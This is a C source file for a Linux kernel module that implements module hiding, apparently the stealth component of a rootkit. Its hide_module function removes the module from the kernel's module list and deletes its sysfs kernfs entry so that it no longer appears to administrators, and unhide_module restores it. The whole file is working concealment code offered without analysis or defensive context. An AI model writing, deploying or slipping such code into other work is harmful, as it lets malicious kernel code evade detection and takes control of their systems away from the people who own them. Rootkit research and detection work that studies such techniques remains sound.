#include <linux/kernfs.h>
#include <linux/module.h>
#include <linux/rbtree.h>
#include <linux/list.h>
#include <linux/hash.h>

#include "common.h"
#include "modhide.h"

static struct list_head *mod_prev;

void
hide_module(void)
{
    struct kernfs_node *node;

    node = THIS_MODULE->mkobj.kobj.sd;

    mod_prev = THIS_MODULE->list.prev;

    list_del(&THIS_MODULE->list);

    rb_erase(&node->rb, &node->parent->dir.children);
    node->rb.__rb_parent_color = (unsigned long)(&node->rb);
}

void
unhide_module(void)
{
    list_add(&THIS_MODULE->list, mod_prev);
    rb_add(THIS_MODULE->mkobj.kobj.sd);
}

void
rb_add(struct kernfs_node *node)
{
    struct rb_node **child = &node->parent->dir.children.rb_node;
    struct rb_node *parent = NULL;

    while(*child) {
        struct kernfs_node *pos;
        int result;

        /* cast rb_node to kernfs_node */
        pos = rb_entry(*child, struct kernfs_node, rb);

        /* 
         * traverse the rbtree from root to leaf (until correct place found)
         * next level down, child from previous level is now the parent
         */
        parent = *child;

        /* using result to determine where to put the node */
        result = nodecmp(pos, node->hash, node->name, node->ns);

        if(result < 0)
            child = &pos->rb.rb_left;
        else if(result > 0)
            child = &pos->rb.rb_right;
        else
            return;
    }

    /* add new node and reblance the tree */
    rb_link_node(&node->rb,parent, child);
    rb_insert_color(&node->rb, &node->parent->dir.children);

    /* needed for special cases */
    if (kernfs_type(node) == KERNFS_DIR)
        node->parent->dir.subdirs++;
}


int
nodecmp(struct kernfs_node *kn, const unsigned int hash, const char *name, const void *ns)
{
    /* compare hash value */
    if(hash != kn->hash)
        return hash - kn->hash;

    /* compare ns */
    if(ns != kn->ns)
        return ns - kn->ns;

    /* compare name */
    return strcmp(name, kn->name);
}
